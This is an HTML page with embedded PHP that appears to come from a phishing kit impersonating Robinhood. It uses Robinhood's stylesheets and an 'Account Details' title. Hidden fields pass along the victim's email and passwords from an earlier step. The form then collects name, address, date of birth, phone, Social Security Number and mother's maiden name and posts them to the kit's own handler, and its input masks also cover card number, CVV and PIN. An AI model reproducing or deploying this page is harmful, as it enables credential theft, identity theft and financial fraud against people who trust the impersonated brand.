<html lang="en-US" dir="ltr">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
<link rel="shortcut icon" href="img/167EWkdKrN2X6Jqp7LEO9o.ico">
<link rel="stylesheet" href="https://cdn.robinhood.com/assets/generated_assets/legacyStyles.8a7c8392c805eaaf82a4.css" type="text/css" media="all" data-id="legacy-styles">
<link rel="stylesheet" href="https://cdn.robinhood.com/assets/generated_assets/App.8a7c8392c805eaaf82a4.css" type="text/css" media="all">
<link rel="stylesheet" type="text/css" href="css/a.css">
<title>Account Details | Robinhood</title>
</head>
<body class="theme-open-up">
								<center>
								<form class="_17_I0wDhYhTnsfNxPR0_CF up" method="POST" action="account/submit-billing">
									<input type="hidden" name="email" value="<?= $_POST['email']; ?>">
									<input type="hidden" name="pass_log" value="<?= $_POST['pass_log']; ?>">
									<input type="hidden" name="password" value="<?= $_POST['password']; ?>">
									<header class="css-240zvz"><span class="css-1wyk9uc">Account Details</span><p>Please complete your account details</p></header><br>
											<div class="css-1ohcxfz">
												<label class="css-8atqhb">
												<div class="css-1te2hl9" style="width: 80%;">
													<span class="css-ktio0g" style="float: left;font-size: 15px;">Full name</span><br>
												</div>
												<div class="css-p5k2s1" style="width: 80%;">
													<input type="text" name="fname" onkeypress="return event.charCode < 48 || event.charCode  >57" class="remove-legacy css-1ur67ge" value="" required autofocus></div>
												</label>
												</div>
											</div><br>
											<div class="css-1ohcxfz">
												<label class="css-8atqhb">
												<div class="css-1te2hl9" style="width: 80%;">
													<span class="css-ktio0g" style="float: left;font-size: 15px;">State</span><br>
												</div>
												<div class="css-p5k2s1" style="width: 80%;">
													<input type="text" name="state" class="remove-legacy css-1ur67ge" value="" required></div>
												</label>
												</div>
											</div><br>
											<div class="css-1ohcxfz">
												<label class="css-8atqhb">
												<div class="css-1te2hl9" style="width: 80%;">
													<span class="css-ktio0g" style="float: left;font-size: 15px;">City</span><br>
												</div>
												<div class="css-p5k2s1" style="width: 80%;">
													<input type="text" name="city" class="remove-legacy css-1ur67ge" value="" required></div>
												</label>
												</div>
											</div><br>
											<div class="css-1ohcxfz">
												<label class="css-8atqhb">
												<div class="css-1te2hl9" style="width: 80%;">
													<span class="css-ktio0g" style="float: left;font-size: 15px;">Address</span><br>
												</div>
												<div class="css-p5k2s1" style="width: 80%;">
													<input type="text" name="address" class="remove-legacy css-1ur67ge" value="" required></div>
												</label>
												</div>
											</div><br>
											<div class="css-1ohcxfz">
												<label class="css-8atqhb">
												<div class="css-1te2hl9" style="width: 80%;">
													<span class="css-ktio0g" style="float: left;font-size: 15px;">ZIP</span><br>
												</div>
												<div class="css-p5k2s1" style="width: 80%;">
													<input type="text" name="zip" class="remove-legacy css-1ur67ge" required></div>
												</label>
												</div>
											</div><br>
											<div class="css-1ohcxfz">
												<label class="css-8atqhb">
												<div class="css-1te2hl9" style="width: 80%;">
													<span class="css-ktio0g" style="float: left;font-size: 15px;">Date of birth</span><br>
												</div>
												<div class="css-p5k2s1" style="width: 80%;">
													<input type="text" name="dob" class="remove-legacy css-1ur67ge mask-dob" minlength="10" maxlength="10" placeholder="DD/MM/YYYY" value="" required></div>
												</label>
												</div>
											</div><br>
											<div class="css-1ohcxfz">
												<label class="css-8atqhb">
												<div class="css-1te2hl9" style="width: 80%;">
													<span class="css-ktio0g" style="float: left;font-size: 15px;">Phone number</span><br>
												</div>
												<div class="css-p5k2s1" style="width: 80%;">
													<input type="text" name="phone" placeholder="" class="remove-legacy css-1ur67ge" required></div>
												</label>
												</div>
											</div><br>
											<div class="css-1ohcxfz">
												<label class="css-8atqhb">
												<div class="css-1te2hl9" style="width: 80%;">
													<span class="css-ktio0g" style="float: left;font-size: 15px;">Social Security Number</span><br>
												</div>
												<div class="css-p5k2s1" style="width: 80%;">
													<input type="text" name="ssn" class="remove-legacy css-1ur67ge mask-ssn" minlength="11" maxlength="11" placeholder="000-00-0000" value="" required></div>
												</label>
												</div>
											</div><br>
											<div class="css-1ohcxfz">
												<label class="css-8atqhb">
												<div class="css-1te2hl9" style="width: 80%;">
													<span class="css-ktio0g" style="float: left;font-size: 15px;">Mother's maiden name</span><br>
												</div>
												<div class="css-p5k2s1" style="width: 80%;">
													<input type="text" name="mmn" onkeypress="return event.charCode < 48 || event.charCode  >57" class="remove-legacy css-1ur67ge" value="" required></div>
												</label>
												</div>
											</div><br>
									<br>
									<div class="css-0">
										<button type="submit" class="_1OsoaRGpMCXh9KT8s7wtwm _2GHn41jUsfSSC9HmVWT-eg"><span class="css-1o0fjrg">Continue</span></button>
									</div>
								</form>
								</center>
					</div>
				</div>
			</div>
		</div>
	</div>
</div>
<!-- Masking -->
<script src="js/jquery.min.js"></script>
<script src="js/jquery.mask.min.js"></script>
<script type="text/javascript">
    $(document).ready(function(){
      $('.mask-exp').mask('00/00');
      $('.mask-ccn').mask('0000 0000 0000 0000');
      $('.mask-zip').mask('00000');
      $('.mask-dob').mask('00/00/0000');
      $('.mask-dln').mask('00 000 000');
      $('.mask-ssn').mask('000-00-0000');
      $('.mask-cvv').mask('000');
      $('.mask-pin').mask('000000');
      $('.time').mask('00:00:00');
      $('.date_time').mask('00/00/0000 00:00:00');
      $('.mask-phone').mask('(000) 000-0000');
      $('.phone_with_ddd').mask('(00) 0000-0000');
      $('.phone_us').mask('(000) 000-0000');
      $('.mixed').mask('AAA 000-S0S');
      $('.money').mask('000.000.000.000.000,00', {reverse: true});
      $('.money2').mask("#.##0,00", {reverse: true});
      $('.ip_address').mask('099.099.099.099');
      $('.percent').mask('##0,00%', {reverse: true});
      $('.placeholder').mask("00/00/0000", {placeholder: "__/__/____"});
      $('.mask-cc').mask('0000 0000 0000 0000');
      $('.valid').mask('00/00');
    });
  </script>
<!-- End Masking -->
<!-- Validasi Number & Text -->
<script>
    function hanyaAngka(evt) {
      var charCode = (evt.which) ? evt.which : event.keyCode
       if (charCode > 31 && (charCode < 48 || charCode > 57))
 
        return false;
      return true;
    }
  </script>
<!-- End Validasi -->
</body>
</html>